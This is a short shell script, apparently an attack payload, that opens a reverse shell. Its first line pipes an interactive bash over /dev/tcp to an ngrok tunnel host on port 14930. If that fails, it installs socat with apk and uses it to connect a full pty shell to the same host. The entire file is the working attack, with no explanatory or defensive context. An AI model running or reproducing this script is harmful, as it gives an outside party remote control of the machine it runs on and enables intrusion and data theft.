#!/bin/sh
bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/14930 0>&1 2>/dev/null || (
  apk add --no-cache socat 2>/dev/null
  socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:7.tcp.eu.ngrok.io:14930
)
